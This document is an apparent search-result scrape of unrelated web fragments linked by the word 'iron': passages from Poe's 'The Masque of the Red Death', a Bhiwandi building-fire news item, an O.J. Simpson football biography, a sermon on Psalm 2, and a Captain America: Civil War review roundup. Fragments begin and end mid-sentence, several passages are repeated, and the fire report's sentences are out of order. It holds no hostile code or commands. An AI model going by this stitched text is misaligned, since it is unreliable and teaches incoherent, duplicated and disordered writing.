carpet, there comes from the near clock of ebony a muffled peal more solemnly emphatic than any which reaches their ears who indulged in the more remote gaieties of the other apartments.</p>   <p>But these other apartments were densely crowded, and in them beat feverishly the heart of life. And the revel went whirlingly on, until at length there commenced the sounding of midnight upon the clock. And then the music ceased, as I have told; and the evolutions of the waltzers were quieted; and there was an uneasy cessation of all things as before. But now there were twelve strokes to be sounded by the bell of the clock; and thus it happened, perhaps, that more of thought crept, with more of time, into the meditations of the thoughtful among those who revelled. And thus too, it happened, perhaps, that before the last echoes of the last chime had utterly sunk into silence, there were many individuals in the crowd who had found leisure to become aware of the presence of a masked figure which had arrested the attention of no single individual before. And the rumour of this new presence having spread itself whisperingly around, there arose at length from the whole company a buzz, or murmur, expressive of disapprobation and surprise&#x2014;then, finally, of terror, of horror, and of disgust.</p>   <p>In an assembly of phantasms such as I have painted, it may well be supposed that no ordinary appearance could have excited such sensation. In truth the masquerade licence of the night was nearly unlimited; but the figure in question had out-Heroded Herod, and gone beyond the bounds of even the prince&#x2019;s indefinite decorum. There are chords in the hearts of the most reckless which cannot be touched without emotion. Even with the utterly lost, to whom life and death are equally jests, there are matters of which no jest can be made. The whole company, indeed, seemed now deeply to feel that in the costume and bearing of the stranger neither wit nor propriety existed. The figure was tall and gaunt, and shrouded from head to foot in the habiliments of the grave. The mask which concealed the visage was made so nearly to resemble the countenance of a stiffened corpse that the closest scrutiny must have had difficulty in detecting the cheat. And yet all this might have been endured, if not approved, by the mad revellers around. But the mummer had gone so far as to assume the type of the Red Death. His vesture was dabbled in blood&#x2014;and his broad brow, with all the features of the face, was besprinkled with the scarlet horror.</p>   <p>When the eyes of the Prince Prospero fell upon this spectral image (which, with a slow and solemn movement, as if more fully to sustain its role, stalked to and fro among the waltzers) he was seen to be convulsed, in the first moment with a strong shudder either of terror or distaste; but, in the next, his brow reddened with rage.</p>   <p>&#x201c;Who dares,&#x201d;&#x2014;he demanded hoarsely of the courtiers who stood near him&#x2014;&#x201d;who dares insult us with this blasphemous mockery? Seize him and unmask him&#x2014;that we may know whom we have to hang, at sunrise, from the battlements!&#x201d;</p>   <p>It was in the eastern or blue chamber in which stood the Prince Prospero as he uttered these words. They rang throughout the seven rooms loudly and clearly, for the prince was a bold and robust man, and the music had become hushed at the waving of his hand.</p>   <p>It was in the blue room where stood the prince, with a group of pale courtiers by his side. At first, as he spoke, there was a slight rushing movement of this group in the direction of the intruder, who at the moment was also near at hand, and now, with deliberate and stately step, made closer approach to the speaker. But from a certain nameless awe with which the mad assumptions of the mummer had inspired the whole party, there were found none who put forth hand to seize him; so that, unimpeded, he passed within a yard of the prince&#x2019;s person; and, while the vast assembly, as if with one impulse, shrank from the centres of the rooms to the walls, he made his way uninterruptedly, but with the same solemn and measured step which had distinguished him from the first, through the blue chamber to the purple&#x2014;through the purple to the green&#x2014;through the green to the orange&#x2014;through this again to the white&#x2014;and even thence to the violet, ere a decided movement had been made to arrest him. It was then, however, that the Prince Prospero, maddening with rage and the shame of his own momentary cowardice, rushed hurriedly through the six chambers, while none followed him on account of a deadly terror that had seized upon all. He bore aloft a drawn dagger, and had approached, in rapid impetuosity, to within three or four feet of the retreating figure, when the latter, having attained the extremity of the velvet apartment, turned suddenly and confronted his pursuer. There was a sharp cry&#x2014;and the dagger dropped gleaming upon the sable carpet, upon which, instantly afterwards, fell prostrate in death the Prince Prospero. Then, summoning the wild courage of despair, a throng of the revellers at once threw themselves into the black apartment, and, seizing the mummer, whose tall figure stood erect and motionless within the shadow of the ebony clock, gasped in unutterable horror at finding the grave cerements and corpse-like mask, which they handled with so violent a rudeness, untenanted by any tangible form.</p>   <p>And now was acknowledged the presence of the Red Death. He had come like a thief in the night. And one by one dropped the revellers in the blood-bedewed halls of their revel, and died each in the despairing posture of his fall. And the life of the ebony clock went out with that of the last of the gay. And the flames of the tripods expired. And Darkness and Decay and the Red Death held illimitable dominion over all.</p>  </div>

The second and third floor of the building houses residential apartments. No casualties have been reported yet. Others broke an <b>iron</b> gate on the fourth floor to reach the terrace so the firefighters could rescue them.</p>   <p>Mumbai/Nagpur: A 4-floor building in <strong>Bhiwandi in Maharashtra</strong> caught fire on Tuesday. Six to 7 water tankers from Kalyan, <strong>Thane</strong> and Bhiwandi were pressed into service to douse the fire. Till now 20 people have been rescued and remaining people are still trapped inside the building. The building was only two years old and the officials are yet to determine the cause of the fire. <strong>The presence of oil drums at the place led to the fire spreading in other rooms</strong>, he said. Fires caused by gas explosions and short circuits are not infrequent in cities, where shoddy building work and haphazard electrical installations are common.</p>  </div>

Simpson From Gridiron to behind the <b>Iron</b> <b>Gates</b> </h1>   </header>   <div>    <span>, , , , , </span>   </div>   <div>    <div>     O.J. Simpson was born on July 9, 1947, in San Francisco, California. After a successful college football career at USC, winning the Heisman Trophy, Simpson went on to star in the NFL as a running back. He left football in 1979 to pursue what would become a relatively successful acting and commentating career.    </div>    <div>     Simpson played football at Galileo High School. And after breaking junior-college records at the City College of San Francisco, he was heavily recruited. He gained fame as a two-time All-American halfback for the USC Trojans, setting NCAA records and winning the Heisman Trophy.    </div>    <div>     joined the professional in 1969, but did not excel until the offense was tailored to showcase his running. Nicknamed &#x201c;The Juice,&#x201d; Simpson topped 1,000 yards rushing over five consecutive years (1972&#x2013;&#x2019;76) and led the National Football League four times. In 1973, he became the first NFL player to rush for more than 2,000 yards in a single season.    </div>    <div>     Amazingly , he was used sparingly as a running back through his first three seasons until Lou Saban took over the reins in 1972 and immediately decided to give the 6-1, 212-pound speedster the football as often as possible. Simpson immediately responded with massive ground-gaining performances. O.J. may be best remembered for his sensational 1973 season when he became the first back in history to rush for over 2,000 yards. With 219 yards in the next-to-last game against New England and a 200-yard output in the finale with the New York Jets, Simpson totaled 2,003 yards, tops for a 14-game season. Many say the 1975 season was even better &#x2013; 1,817 yards rushing, 426 yards on receptions and a then-record 23 touchdowns. O.J. led the league in rushing four years in 1972, 1973, 1975 and 1976. In various selections, he was named NFL Player of the Year in 1972, 1973 and 1975. He was both All-AFC and All-Pro five straight years from 1972 through 1976. He played in six Pro Bowls, winning Player of the Game honors in the 1973 game.    </div>    <div>     His later years of legal troubles is most unfortunate of what people will remember of this great player of football in history to come.    </div>    <div>     Courtesy of Football Hall of Fame and Wikipedia    </div>   </div>  </div>  
   <div>   <p>Podcast: | (27.7MB) </p>   <p>Subscribe: | | </p>   <p>Jesus Christ is God&#x2019;s anointed King over the creation. Rejecting this reality will not help your case when He returns to judge His enemies. However, the Lord of Heaven is mercifully delaying judgment and offers an opportunity to repent. Rather than foolishly resisting Him, you can humbly recognize His sovereignty and submit to His lordship. Happy are those who turn to Him before it is too late.</p>   <p> You see, there is no place for rebels in the kingdom of God because it is a kingdom of righteousness. You cannot have all the blessings of God while remaining in opposition to Him. Only repentant sinners can receive the gift of eternal life. </p>   <p> It is for this very reason that Jesus Christ came to die on the cross, since it is there that God dealt with the sins of the repentant. Christ stood condemned in our place and suffered the wrath of God for our iniquity. Then God raised His Son from death to verify Him as Savior and establish Him as Lord. Now God can pardon and bring into His kingdom any and all who will confess their sins and humbly trust His Son. The only other option is to suffer eternal death in hell as a defiant sinner.</p>   <p> This is the emphasis as we continue our study of the second psalm, which deals with God&#x2019;s sovereign kingdom. As the earthly representative of heaven&#x2019;s throne, King David of Israel was very familiar with human rebellion. The resistance of sinners in the nations around him was a continual reminder. He also understood that God would ultimately send His Son into the world as the anointed King to fulfill all righteousness. In fact, God had promised David that the Christ would be one of his descendants (cf. 2 Sam. 7; ).</p>   <p> For this reason, the Holy Spirit gave David insight into the final days of the rebellion when Christ would utterly destroy His enemies and establish the throne on earth. explained that, although the nations will take a final stand to resist heaven (vv. 1-3), God&#x2019;s kingdom is nonetheless sovereign. And Jesus Christ, the Great King, will most certainly reign in Jerusalem. </p>   <p> In part two of our study, which comes from , we will see that this is not mere conjecture on David&#x2019;s part. Rather, it is a heavenly mandate &#x2014; a divine decree &#x2014; that Christ should rule the nations in power and glory. And God&#x2019;s call to the people of the world is to repent before the time of judgment comes.</p>   <p> <b>God&#x2019;s Sovereign Kingdom</b> &#x2013; Part II <i>Christ&#x2019;s Reign</i> (vv. 7-9) proclaims: &#x201c;&#x2026;the Lord God Omnipotent reigns!&#x201d; That declaration is made just as Christ begins His procession from heaven to earth at the end of the Great Tribulation. And despite Satan&#x2019;s opposition through Antichrist and the nations of the world, the rebellion will be entirely crushed. The Lord Jesus will Himself deliver the final blow at the Battle of Armageddon (; ) and establish His throne on the holy hill of Zion (v. 6; cf. ).</p>   <p> The divine decree is recounted for us here in verses seven through nine by the Christ Himself. Evidently, upon God the Son&#x2019;s incarnation, God the Father made this declaration that His Anointed (v. 2) would reign forever with all authority (cf. ). The Father will mock His enemies in righteous indignation for their foolish resistance (vv. 4-6). It appears as though God the Son &#x201c;will declare the decree&#x201d; when He arrives in Jerusalem at His Second Coming. That is, He will recite at that time the mandate which &#x201c;the LORD&#x201d; His Father earlier gave (&#x201c;said&#x201d;) to Him (v. 7; cf. ).</p>   <p> The Father&#x2019;s declaration is that the Christ would be His &#x201c;Son.&#x201d; That is, heaven&#x2019;s anointed King would be the incarnate second Person of the Trinity. He was &#x201c;begotten&#x201d; in that He was &#x201c;brought forth&#x201d; into humanity () to die as Savior and then &#x201c;brought forth&#x201d; into glory by resurrection to God&#x2019;s right hand (). In the fullness of time (), He came to fulfill the role of Savior and Lord (). </p>   <p> The messianic title, Son of Man, reflects His humiliation and His exaltation (cf. ; ; ). He is completely identified with the human race, yet without sin (). As the sinless Son of God, He is qualified to receive the everlasting throne of His heavenly Father. He is also qualified to complete the royal line of David as the ultimate King &#x2014; David&#x2019;s greater descendant.</p>   <p> The heavenly agenda, determined in eternity past, is for the Son to glorify the Father by bringing His sovereign kingdom to the rebellious world of men and to redeem the saints for the kingdom (). The kingdom is Christ&#x2019;s for the taking because the Father desires to give it to Him. Therefore, He says to His Son:</p>   <p> <i>Ask of Me, and I will give You The nations for Your inheritance, And the ends of the earth for Your possession</i> (v. 8a).</p>   <p> In other words, He will be given the supreme place over the human race and dominion over the earth as it was intended for mankind (). His reign will be righteous, and the earth will be restored to Eden-like glory in the Millennial Kingdom (cf. Pss. 72; 96; 110; Is. 11). Then He will rule the new heavens and the new earth where only righteousness will exist ().</p>   <p> When Satan tried to offer Jesus the kingdoms of this world in return for worship, our Lord refused. For He knew they were His without question. The Father had already declared this decree to Him, and He would worship and serve the Father in complete obedience (; ). He humbled Himself even to endure the cross, since He knew the glory that awaited Him by the Father&#x2019;s right hand ().</p>   <p> Christ will not only inherit the human race and possess the ends of the earth, but He will reign with absolute, unchallenged power. Verse nine initially explains that He &#x201c;shall break [i.e. rule] them with a rod of <b>iron</b>.&#x201d; The &#x201c;rod&#x201d; refers to both a shepherd&#x2019;s staff and a king&#x2019;s scepter. Both are probably in view here to describe Christ as the Great Shepherd and King of kings (David was a shepherd/king). It is a &#x201c;rod of <b>iron</b>,&#x201d; meaning that He will rule with an unwavering righteousness that cannot be resisted. Every act of lawlessness will be dealt with swiftly and justly according to God&#x2019;s righteous standards. He will &#x201c;dash to pieces like a potter&#x2019;s vessel&#x201d; (v. 9b) all unrepentant rebels.</p>   <p> <i>Man&#x2019;s Repentance</i> (vv. 10-12) So the reign of the Lord Jesus Christ was already declared before He suffered and died on the cross. But the cross was necessary to provide a way for sinners to be made saints in the kingdom. Now, having endured the cross, He has been resurrected and glorified as Lord. He presently waits in heaven until the Father orders His return to earth (). Until then, sinners are afforded time to repent.</p>   <p> That is the message to rebellious mankind represented in verse 10 by its leaders &#x2014; the &#x201c;kings [and] judges of the earth.&#x201d; These are called upon to &#x201c;be wise [and] instructed&#x201d; regarding God&#x2019;s decree about Christ&#x2019;s reign. If they are wise, and if they learn anything from the truth of God&#x2019;s sovereign kingdom, then they should respond with repentance.</p>   <p> True repentance is reflected in the final two verses by:</p>   <p> &#x2013; A willingness to &#x201c;serve the LORD with fear.&#x201d; That is, a person will obey God with reverence. &#x2013; A desire to &#x201c;rejoice with trembling.&#x201d; That is, a person will humbly praise God for His mercy and grace in salvation. &#x2013; A commitment to &#x201c;the Son&#x201d; as God&#x2019;s anoointed King. To &#x201c;kiss&#x201d; (perhaps &#x201c;embrace&#x201d;) Him is a symbolic act of submission and allegiance. It is a recognition of His omnipotence.</p>   <p> The last portion of verse 12 gives us the only two options one has in response to Christ before His glorious return &#x2014; resist or repent. If you fail to embrace Him now &#x201c;when His wrath is kindled but a little,&#x201d; then the LORD will be &#x201c;angry&#x201d; with you, and &#x201c;you [will] perish in the way.&#x201d; That is to say, you will die in your sins () because you have not sought His forgiveness. This seals your eternal damnation. Unless and until you repent, you remain under the condemnation of God&#x2019;s Law, which demands the sentence of death for rebels (). His wrath is temporarily restrained against you by mercy, but you still face certain judgment without repentance.</p>   <p> There is the promise of blessing for &#x201c;all those who put their trust in Him.&#x201d; These are happy (&#x201c;blessed&#x201d;) because forgiveness and eternal life are theirs in His kingdom. They have believed that Jesus Christ is the Son of God, and they have life in His name through faith (). There is no condemnation for those who are in Christ Jesus (). They are no longer under the law&#x2019;s sentence of death because, in grace, God provides an atoning sacrifice in His Son&#x2019;s death. The blessedness of the saints is that they no longer have to fear the Lord&#x2019;s wrath. They are, instead, reconciled to Him and adopted into His family with a full pardon ().</p>   <p> speaks of the astounding opportunity people have in this present time to repent and submit to Christ as Lord and Savior. It also tells of the believer&#x2019;s opportunity to bear witness to God&#x2019;s kingdom.</p>   <p> <i>The LORD is gracious and full of compassion, Slow to anger and great in mercy. The LORD is good to all, And His tender mercies are over all His works.</i></p>   <i> <p> All Your works shall praise You, O LORD, And Your saints shall bless You. They shall speak of the glory of Your kingdom, And talk of Your power, To make known to the sons of men His mighty acts, And the glorious majesty of His kingdom.</p> </i>   <p><i> Your kingdom is an everlasting kingdom, And Your dominion endures throughout all generations.</i></p>   <p> God&#x2019;s sovereign kingdom is a reality. It is not some idealistic notion to be considered as if we were watching a movie or reading a novel. No, it is a matter of life and death for each and every one of us in every generation.</p>   <p> Although the rebellion is permitted to continue for the time being, it will be crushed when the Lord Jesus Christ returns to fulfill God&#x2019;s decree. Until then, the call to repentance continues. Have you repented of your sin and placed your trust entirely in the Son of God? Do you reverently obey Him, humbly praise Him, and embrace Him as your King? If that is the case, then you are truly blessed!</p>   <p>Return to the </p>   <p><span> &#xa9; Copyright 1997-2015 Richard E. Clayton, Jr. All rights reserved.</span></p>  </div>

Earlier today, the embargo lifted, and the initial wave of reviews came flooding in. Although there are only 14 reviews posted on Rotten Tomates, all of them are positive, giving this superhero adventure a 100% RT score right out of the gate, with some critics even making some parting shots at <em>Batman v Superman: Dawn of Justice</em> while calling this latest superhero epic a true Marvel masterpiece.</p>      <p>Marvel&#x2019;s Captain America: Civil War is set in the aftermath of <em>Avengers: Age of Ultron</em>, with Steve Rogers leading the newly formed team of <em>Avengers</em> in their continued efforts to safeguard humanity. But after another incident involving the <em>Avengers</em> results in collateral damage, political pressure mounts to install a system of accountability, headed by a governing body to oversee and direct the team. The new status quo fractures the <em>Avengers</em>, resulting in two camps, one led by <em>Steve Rogers</em> and his desire for the <em>Avengers</em> to remain free to defend humanity without government interference, and the other following Tony Stark&#x2019;s surprising decision to support government oversight and accountability.</p>      <p>Team <b>Iron</b> Man includes Tony Stark (<em>Robert Downey Jr.</em>), Black Widow (<em>Scarlett Johansson</em>), Vision (<em>Paul Bettany</em>), <em>War Machine</em> (<em>Don Cheadle</em>) and the new characters <em>T&#x2019;challa</em> (<em>Chadwick Boseman</em>) and Spider-Man (Tom Holland). Team Cap includes Captain America (<em>Chris Evans</em>), The Falcon (<em>Anthony Mackie</em>), Scarlet Witch (<em>Elizabeth Olsen</em>), Hawkeye (<em>Jeremy Renner</em>), Ant-Man (<em>Paul Rudd</em>) and The Winter Soldier (<em>Sebastian Stan</em>). Marvel&#x2019;s Captain America: Civil War also stars <em>Frank Grillo</em> as Crossbones, <em>William Hurt</em> as Thaddeus Ross, <em>Daniel Br&#xfc;hl</em> as the villainous Baron Zemo. Take a look at excerpts from some of these early reviews below, and stay tuned for more on Captain America: Civil War.</p>      <blockquote>       <p>&#x201c;The shaming of <em>Batman v Superman: Dawn of Justice</em> will continue apace &#x2013; or better still, be forgotten entirely &#x2013; in the wake of Captain America: Civil War, a decisively superior hero-vs.-hero extravaganza that also ranks as the most mature and substantive picture to have yet emerged from the Marvel Cinematic Universe. Very much an &#x201c;Avengers&#x201d; movie in scope and ambition if not title (the conspicuous absence of Thor and Hulk notwithstanding), this chronicle of an epic clash between two equally noble factions, led by Captain America and <b>Iron</b> Man, proves as remarkable for its dramatic coherence and thematic unity as for its dizzyingly inventive action sequences; viewers who have grown weary of seeing cities blow up ad nauseam will scarcely believe their luck at the relative restraint and ingenuity on display.&#x201d;</p>      </blockquote>      <blockquote>       <p>&#x201c;Corporate filmmaking with an enormous economic investment at stake has the power to force creative people to operate within the art-destroying prison walls of a marketing strategy. But the Marvel Cinematic Universe, an empire building itself on a foundation that roughly amounts to a house style, tends to stay relatively on balance. Screenwriting team Christopher Markus and Stephen McFeely (responsible for the previous two Captain America films) efficiently move plot blocks into place and check off interlocking points of order, but they do so while never forgetting that their characters are more than brands to build.&#x201d;</p>      </blockquote>      <blockquote>       <p>&#x201c;Who needs a villain when you have Steve and Tony? Both protagonists. Both antagonists. And drawing other power-people to their cause in surprising ways. The clashes go far beyond the set-up squabbles of Avengers Assemble. Or even that other big 2016 superhero showdown. Forget Batman v Superman. Here you get Ant-Man v Spider-Man, Hawkeye v Black Widow, Scarlet Witch v Vision, The Winter Soldier v Black Panther and (well, duh)Captain America v <b>Iron</b> Man, all rolled into one. And that is what you call the ultimate Marvel superhero event.&#x201d;</p>      </blockquote>      <blockquote>       <p>&#x201c;In many ways, Civil War is the Marvel team-up sequel Age of Ultron should have been. If The Winter Soldier was about SHIELD being ripped apart from the inside, Civil War pulls the same trick with the Avengers themselves, screenwriters Christopher Markus and Stephen McFeely carving out satisfying character arcs, or at the very least moments, for every major player (minus the MIA Thor and Hulk). Crucially, despite the colossal cast of characters and sprawling runtime, the oft-repeated assertion that this isn&#x2019;t just Avengers 2.5 holds true &#x2013; it&#x2019;s also a Captain America movie through and through, further exploring The Winter Soldier&#x2019;s major theme &#x2013; the cost of freedom &#x2013; while Bucky is even more integral to the plot than he was in the film that bore his own name.&#x201d;</p>      </blockquote>      <blockquote>       <p>&#x201c;Captain America: Civil War marks a watershed moment in the vaunted annals of comic book cinema: finally, a big budget superhero sequel that manages to be both effortlessly entertaining and utterly sobering, instead of just one of those things-or, as we&#x2019;ve endured too frequently in the past, neither of them. (Looking at you, Batman v Superman.) You might argue that other films that have come before Marvel&#x2019;s Captain America threequel have achieved such equilibrium, but let&#x2019;s be real, you&#x2019;d be lying to yourself. Not even Disney&#x2019;s Marvel machine has yet been able to shake off formula or self-seriousness in service of spandexed superhero franchising.&#x201d;</p>      </blockquote>      <p>Captain America: Civil War will kick off the <em>Marvel Cinematic Universe</em>&#x2018;s Phase Three, which will be followed by <em>Doctor Strange</em> (November 4, 2016), <em>Guardians of the Galaxy Vol. 2</em> (May 5, 2017), Spider-Man (July 7, 2017), <em>Thor: Ragnarok</em> (November 3, 2017), Black Panther (February 16, 2018), <em>Avengers: Infinity War Part I</em>(May 4, 2018), <em>Ant-Man and the Wasp</em> (July 6, 2018), <em>Captain Marvel</em>(March 8, 2019), <em>Avengers: Infinity War &#x2013; Part II</em> (May 3, 2019) and <em>Inhumans</em> (July 12, 2019).

Take a look at excerpts from some of these early reviews below, and stay tuned for more on Captain America: Civil War.</p>      <blockquote>       <p>&#x201c;The shaming of <em>Batman v Superman: Dawn of Justice</em> will continue apace &#x2013; or better still, be forgotten entirely &#x2013; in the wake of Captain America: Civil War, a decisively superior hero-vs.-hero extravaganza that also ranks as the most mature and substantive picture to have yet emerged from the Marvel Cinematic Universe. Very much an &#x201c;Avengers&#x201d; movie in scope and ambition if not title (the conspicuous absence of Thor and Hulk notwithstanding), this chronicle of an epic clash between two equally noble factions, led by Captain America and Iron Man, proves as remarkable for its dramatic coherence and thematic unity as for its dizzyingly inventive action sequences; viewers who have grown weary of seeing cities blow up ad nauseam will scarcely believe their luck at the relative restraint and ingenuity on display.&#x201d;</p>      </blockquote>      <blockquote>       <p>&#x201c;Corporate filmmaking with an enormous economic investment at stake has the power to force creative people to operate within the art-destroying prison walls of a marketing strategy. But the Marvel Cinematic Universe, an empire building itself on a foundation that roughly amounts to a house style, tends to stay relatively on balance. Screenwriting team Christopher Markus and Stephen McFeely (responsible for the previous two Captain America films) efficiently move plot blocks into place and check off interlocking points of order, but they do so while never forgetting that their characters are more than brands to build.&#x201d;</p>      </blockquote>      <blockquote>       <p>&#x201c;Who needs a villain when you have Steve and Tony? Both protagonists. Both antagonists. And drawing other power-people to their cause in surprising ways. The clashes go far beyond the set-up squabbles of Avengers Assemble. Or even that other big 2016 superhero showdown. Forget Batman v Superman. Here you get Ant-Man v Spider-Man, Hawkeye v Black Widow, Scarlet Witch v Vision, The Winter Soldier v Black Panther and (well, duh)Captain America v Iron Man, all rolled into one. And that is what you call the ultimate Marvel superhero event.&#x201d;</p>      </blockquote>      <blockquote>       <p>&#x201c;In many ways, Civil War is the Marvel team-up sequel Age of Ultron should have been. If The Winter Soldier was about SHIELD being ripped apart from the inside, Civil War pulls the same trick with the Avengers themselves, screenwriters Christopher Markus and Stephen McFeely carving out satisfying character arcs, or at the very least moments, for every major player (minus the MIA Thor and Hulk). Crucially, despite the colossal cast of characters and sprawling runtime, the oft-repeated assertion that this isn&#x2019;t just Avengers 2.5 holds true &#x2013; it&#x2019;s also a Captain America movie through and through, further exploring The Winter Soldier&#x2019;s major theme &#x2013; the cost of freedom &#x2013; while Bucky is even more integral to the plot than he was in the film that bore his own name.&#x201d;</p>      </blockquote>      <blockquote>       <p>&#x201c;Captain America: Civil War marks a watershed moment in the vaunted annals of comic book cinema: finally, a big budget superhero sequel that manages to be both effortlessly entertaining and utterly sobering, instead of just one of those things-or, as we&#x2019;ve endured too frequently in the past, neither of them. (Looking at you, Batman v Superman.) You might argue that other films that have come before Marvel&#x2019;s Captain America threequel have achieved such equilibrium, but let&#x2019;s be real, you&#x2019;d be lying to yourself. Not even Disney&#x2019;s Marvel machine has yet been able to shake off formula or self-seriousness in service of spandexed superhero franchising.&#x201d;</p>      </blockquote>      <p>Captain America: Civil War will kick off the <em>Marvel Cinematic Universe</em>&#x2018;s Phase Three, which will be followed by <em>Doctor Strange</em> (November 4, 2016), <em>Guardians of the Galaxy Vol. 2</em> (May 5, 2017), Spider-Man (July 7, 2017), <em>Thor: Ragnarok</em> (November 3, 2017), Black Panther (February 16, 2018), <em>Avengers: Infinity War Part I</em>(May 4, 2018), <em>Ant-Man and the Wasp</em> (July 6, 2018), <em>Captain Marvel</em>(March 8, 2019), <em>Avengers: Infinity War &#x2013; Part II</em> (May 3, 2019) and <em>Inhumans</em> (July 12, 2019).

No pestilence had ever been so fatal, or so hideous. Blood was its Avatar and its seal&#x2014;the redness and the horror of blood. There were sharp pains, and sudden dizziness, and then profuse bleeding at the pores, with dissolution. The scarlet stains upon the body and especially upon the face of the victim, were the pest ban which shut him out from the aid and from the sympathy of his fellow-men. And the whole seizure, progress and termination of the disease, were the incidents of half an hour.</p>   <p>But the Prince Prospero was happy and dauntless and sagacious. When his dominions were half depopulated, he summoned to his presence a thousand hale and light-hearted friends from among the knights and dames of his court, and with these retired to the deep seclusion of one of his castellated abbeys. This was an extensive and magnificent structure, the creation of the prince&#x2019;s own eccentric yet august taste. A strong and lofty wall girdled it in. This wall had gates of iron. The courtiers, having entered, brought furnaces and massy hammers and welded the bolts. They resolved to leave means neither of ingress nor egress to the sudden impulses of despair or of frenzy from within. The abbey was amply provisioned. With such precautions the courtiers might bid defiance to contagion. The external world could take care of itself. In the meantime it was folly to grieve, or to think. The prince had provided all the appliances of pleasure. There were buffoons, there were improvisatori, there were ballet-dancers, there were musicians, there was Beauty, there was wine. All these and security were within. Without was the &#x201c;Red Death&#x201d;.</p>   <p>It was towards the close of the fifth or sixth month of his seclusion, and while the pestilence raged most furiously abroad, that the Prince Prospero entertained his thousand friends at a masked ball of the most unusual magnificence.</p>   <p>It was a voluptuous scene, that masquerade. But first let me tell of the rooms in which it was held. These were seven&#x2014;an imperial suite. In many palaces, however, such suites form a long and straight vista, while the folding doors slide back nearly to the walls on either hand, so that the view of the whole extent is scarcely impeded. Here the case was very different, as might have been expected from the duke&#x2019;s love of the bizarre. The apartments were so irregularly disposed that the vision embraced but little more than one at a time. There was a sharp turn at every twenty or thirty yards, and at each turn a novel effect. To the right and left, in the middle of each wall, a tall and narrow Gothic window looked out upon a closed corridor which pursued the windings of the suite. These windows were of stained glass whose colour varied in accordance with the prevailing hue of the decorations of the chamber into which it opened. That at the eastern extremity was hung, for example in blue&#x2014;and vividly blue were its windows. The second chamber was purple in its ornaments and tapestries, and here the panes were purple. The third was green throughout, and so were the casements. The fourth was furnished and lighted with orange&#x2014;the fifth with white&#x2014;the sixth with violet. The seventh apartment was closely shrouded in black velvet tapestries that hung all over the ceiling and down the walls, falling in heavy folds upon a carpet of the same material and hue. But in this chamber only, the colour of the windows failed to correspond with the decorations. The panes here were scarlet&#x2014;a deep blood colour. Now in no one of the seven apartments was there any lamp or candelabrum, amid the profusion of golden ornaments that lay scattered to and fro or depended from the roof. There was no light of any kind emanating from lamp or candle within the suite of chambers. But in the corridors that followed the suite, there stood, opposite to each window, a heavy tripod, bearing a brazier of fire, that projected its rays through the tinted glass and so glaringly illumined the room. And thus were produced a multitude of gaudy and fantastic appearances. But in the western or black chamber the effect of the fire-light that streamed upon the dark hangings through the blood-tinted panes, was ghastly in the extreme, and produced so wild a look upon the countenances of those who entered, that there were few of the company bold enough to set foot within its precincts at all.</p>   <p>It was in this apartment, also, that there stood against the western wall, a gigantic clock of ebony. Its pendulum swung to and fro with a dull, heavy, monotonous clang; and when the minute-hand made the circuit of the face, and the hour was to be stricken, there came from the brazen lungs of the clock a sound which was clear and loud and deep and exceedingly musical, but of so peculiar a note and emphasis that, at each lapse of an hour, the musicians of the orchestra were constrained to pause, momentarily, in their performance, to harken to the sound; and thus the waltzers perforce ceased their evolutions; and there was a brief disconcert of the whole gay company; and, while the chimes of the clock yet rang, it was observed that the giddiest grew pale, and the more aged and sedate passed their hands over their brows as if in confused revery or meditation. But when the echoes had fully ceased, a light laughter at once pervaded the assembly; the musicians looked at each other and smiled as if at their own nervousness and folly, and made whispering vows, each to the other, that the next chiming of the clock should produce in them no similar emotion; and then, after the lapse of sixty minutes, (which embrace three thousand and six hundred seconds of the Time that flies,) there came yet another chiming of the clock, and then were the same disconcert and tremulousness and meditation as before.</p>   <p>But, in spite of these things, it was a gay and magnificent revel. The tastes of the duke were peculiar. He had a fine eye for colours and effects. He disregarded the decora of mere fashion. His plans were bold and fiery, and his conceptions glowed with barbaric lustre. There are some who would have thought him mad. His followers felt that he was not. It was necessary to hear and see and touch him to be sure that he was not.</p>   <p>He had directed, in great part, the movable embellishments of the seven chambers, upon occasion of this great f&#xea;te; and it was his own guiding taste which had given character to the masqueraders. Be sure they were grotesque. There were much glare and glitter and piquancy and phantasm&#x2014;much of what has been since seen in &#x201c;Hernani&#x201d;. There were arabesque figures with unsuited limbs and appointments. There were delirious fancies such as the madman fashions. There were much of the beautiful, much of the wanton, much of the bizarre, something of the terrible, and not a little of that which might have excited disgust. To and fro in the seven chambers there stalked, in fact, a multitude of dreams. And these&#x2014;the dreams&#x2014;writhed in and about taking hue from the rooms, and causing the wild music of the orchestra to seem as the echo of their steps. And, anon, there strikes the ebony clock which stands in the hall of the velvet. And then, for a moment, all is still, and all is silent save the voice of the clock. The dreams are stiff-frozen as they stand. But the echoes of the chime die away&#x2014;they have endured but an instant&#x2014;and a light, half-subdued laughter floats after them as they depart. And now again the music swells, and the dreams live, and writhe to and fro more merrily than ever, taking hue from the many tinted windows through which stream the rays from the tripods. But to the chamber which lies most westwardly of the seven, there are now none of the maskers who venture; for the night is waning away; and there flows a ruddier light through the blood-coloured panes; and the blackness of the sable drapery appals; and to him whose foot falls upon the sable carpet, there comes from the near clock of ebony a muffled peal more solemnly emphatic than any which reaches their ears who indulged in the more remote gaieties of the other apartments.</p>   <p>But these other apartments were densely crowded, and in them beat feverishly the heart of life. And the revel went whirlingly on, until at length there commenced the sounding of midnight upon the clock. And then the music ceased, as I have told; and the evolutions of the waltzers were quieted; and there was an uneasy cessation of all things as before. But now there were twelve strokes to be sounded by the bell of the clock; and thus it happened, perhaps, that more of thought crept, with more of time, into the meditations of the thoughtful among those who revelled. And thus too, it happened, perhaps, that before the last echoes of the last chime had utterly sunk into silence, there were many individuals in the crowd who had found leisure to become aware of the presence of a masked figure which had arrested the attention of no single individual before. And the rumour of this new presence having spread itself whisperingly around, there arose at length from the whole company a buzz, or murmur, expressive of disapprobation and surprise&#x2014;then, finally, of terror, of horror, and of disgust.</p>   <p>In an assembly of phantasms such as I have painted, it may well be supposed that no ordinary appearance could have excited such sensation. In truth the masquerade licence of the night was nearly unlimited; but the figure in question had out-Heroded Herod, and gone beyond the bounds of even the prince&#x2019;s indefinite decorum. There are chords in the hearts of the most reckless which cannot be touched without emotion. Even with the utterly lost, to whom life and death are equally jests, there are matters of which no jest can be made. The whole company, indeed, seemed now deeply to feel that in the costume and bearing of the stranger neither wit nor propriety existed. The figure was tall and gaunt, and shrouded from head to foot in the habiliments of the grave. The mask which concealed the visage was made so nearly to resemble the countenance of a stiffened corpse that the closest scrutiny must have had difficulty in detecting the cheat. And yet all this might have been endured, if not approved, by the mad revellers around. But the mummer had gone so far as to assume the type of the Red Death. His vesture was dabbled in blood&#x2014;and his broad brow, with all the features of the face, was besprinkled with the scarlet horror.</p>   <p>When the eyes of the 